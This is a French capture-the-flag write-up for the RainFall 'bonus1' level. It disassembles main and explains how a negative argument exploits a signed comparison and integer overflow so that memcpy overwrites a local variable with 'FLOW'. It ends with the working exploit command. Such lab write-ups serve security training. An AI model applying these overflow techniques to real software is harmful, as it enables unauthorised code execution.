On a un executable bonus1 
Essaie avec un ou deux arguments (argv), mais rien ne s'est passé.

bonus1@RainFall:~$ ./bonus1 argv1
bonus1@RainFall:~$ ./bonus1 argv1 argv2
bonus1@RainFall:~$


Avec gdb et info functions, on ne voit qu'une fonction intéréssante: main 

Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.

Les trois éléments clés :

- n est en esp+0x3c
- la destination du memcpy, buf, est en esp+0x14
- distance : 0x3c - 0x14 = 0x28 = 40 octets

La contradiction centrale
Premier test : n <= 9
Second test : n == 0x574f4c46 (= 1 464 814 662)

Une même valeur ne peut pas être à la fois ≤ 9 et aussi grande. Sauf si n est écrasé au milieu par le memcpy — et comme le buffer cible n'est qu'à 40 octets de n, copier plus de 40 octets suffit à l'écraser. C'est le point d'entrée.

# Casser les deux pièges en même temps

Piège 1 : comparaison signée. cmpl $0x9 ; jle est signé, donc un nombre négatif passe (un négatif est ≤ 9).

Piège 2 : taille = n*4. Pour que memcpy copie 44 octets (et atteigne n aux offsets 40 à 43), il faudrait n*4 = 44 → n = 11, mais 11 > 9 échoue.

On résout les deux avec un débordement d'entier : trouver un n tel que

signé, n <= 9 (donc négatif);
(n*4) mod 2^32 = 44 (la taille de memcpy est un size_t, non signé).

Solution : n = 11 - 2^30 = -1073741813

-1073741813 <= 9  passe le premier test;
-1073741813 * 4 = -4294967252, en non signé 32 bits = -4294967252 + 2^32 = 44;

Donc memcpy copie 44 octets : les 40 premiers dans buf, les 4 derniers tombent pile sur n.

# Construire argv[2]

memcpy(buf, argv[2], 44) : buf[0..39] = bourrage, buf[40..43] écrase n. Pour que n devienne 0x574f4c46, ces 4 octets en little-endian = 46 4c 4f 57 = "FLOW" :

argv[2] = "A"*40 + "FLOW"   (44 octets au total)

# Exploit
bash
./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')